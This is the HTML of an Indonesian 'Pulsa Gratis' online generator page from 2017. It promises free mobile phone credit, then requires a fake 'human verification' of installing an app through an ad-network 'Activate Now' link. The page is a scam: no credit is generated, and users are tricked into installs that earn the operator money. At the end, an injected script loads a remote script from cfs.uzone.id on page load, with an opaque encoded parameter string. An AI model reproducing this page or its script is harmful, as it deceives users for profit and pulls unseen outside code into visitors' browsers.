...
<html>
   <head>
      <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
       ...
       <title>Pulsa Gratis - Online Generator</title>
   ...
   <body cz-shortcut-listen="true" >
      ...
      <div id="X00WrapperMain">
         <div style="">
            <div><span class="label label-default"><strong>Pulsa Gratis Semua Operator Indonesia</strong></span></div>
         ...
         <div style="margin-bottom: -37px; text-align: center;">
            <a href="index.html"><img id="X00ImageHeader" src="img/pulsa-online-gratis.png"></a>
            <div style="text-align: right; margin-bottom: 19px; ">
               <span class="label label-default" style="font-weight: bold;">Version 4.11 (2017)</span>
            </div>
         </div>
         <div id="X00WrapperStart" class="panel panel-default">
            <div class="panel-heading">
               <div class="form-group" style="margin-bottom: 10px;">
				<label style="font-weight: bold;font-size: 13px;padding-left: 10px;">Nomor Handphone:</label><br>
          ...
          <span class="input-group-addon"><img src="img/rp.png" style="max-width: 30px;"></span>
            ...
            <button id="X00ButtonStart" class="btn btn-success" type="button" style="">Generate</button>
            </span>
...
<div class="panel-body">
Generate Pulsa Anda hampir selesai, silahkan verifikasi untuk menyelesaikan proses pengisian pulsa.<br>
Cara Verifikasi<br>
1) Klik tombol "<span style="color: lime;">Activate</span>" dibawah<br>
2) <span style="color: lime;">Install 1 Aplikasi</span>, ini digunakan untuk memverifikasi bahwa anda manusia, bukan robot!<br>
3) Setelah selesai anda akan diarahkan kembali ke halaman ini dan tekan Tombol Finish<br>
4) Tunggu beberapa saat, pulsa Anda akan bertambah sesuai nominal yang anda isikan<br><br>
Status: <span style="color: lime;">Menunggu Verifikasi</span><br>
</div>
			<div class="panel-footer text-center">
               <div class="btn-group" role="group">
                  <div class="input-group">
                    <span class="input-group-btn">
                      <a href="http://wap4dollar.com/ad/nonadult/serve.php?id=05f9n1fz0f " class="glyphicon glyphicon-lock check btn btn-success" onclick="og_load();"> <font face="lato" style="margin-left: -5px;">Activate Now</font></a>
                    </span>
                  </div>
               </div>
            </div>
         ...
         <div class="small text-center" style="background:#485563;">
            Copyright &copy; 2017. All rights reserved. <a href="index.html">Pulsa Online Generator</span></a>
         </div>
      </div>
         ...
         <div class="modal-dialog">
            <div class="modal-content">
               ...
               <div class="modal-footer">
                ...
                <button id="X00ButtonCancel" type="button" class="btn btn-default" data-dismiss="modal">Batal</button>
                <button id="X00ButtonContinue" type="button" class="btn btn-success">Ya</button>
               </div>
            </div>
         </div>
      </div>
   ...
   <script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "cfs.uzone.id/2fn7a2/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582CL4NjpNgssK3YQe6yKRI13Dkpv0Zl%2fObl7VqEOkGBJoHMYUz6irgOQKfQ5EBacdIWpgaGZhQeBw7lsiU1sWObRtrQbFjkHqvWw6WtQbqN6smdqEtsJOIjGPxidxIQauwVUU%2fiMPn5Rlp8MKV8hQyUKBP7dBVsEamJ1LiRqjUFfLlmq%2b9eosD9ND4A0V7mDihlY7R5VShabCzoutLzV4L8PKZkY1C9MKymY%2fDSHPL1wm2YqIcimQyuPLgyJovvQYc3N4il4nFknwgdmwHq%2bGEobhimdYEnc0pNN%2bb%2fo1dgukcSQ9GKPAHshWnhXPIH1aLnQ6Zw9nvNt%2f4B5DmQedSJI8mAvRWD2u4XbzpENtqAlDbBBSC3k9IIpBfwG1NQJqoiz986DMvhfd0qjTZHBgitN6%2fqpKGea67SYkY7oP15hPTXvpuahLZzF4AqBCe8a7Mv4M2EY0hlcJiUpx9GLlfBHWEMYo1U2Cx9JkFVOCtKlxIa8YdLwj30zJlTzlE2hueBMRM9Ois6n97QOBvvmk17Q7y0eRVLn9DICOMp2f7OldVPHz2RZwBgjuWhd48l%2bGhA%3d%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>
</html>
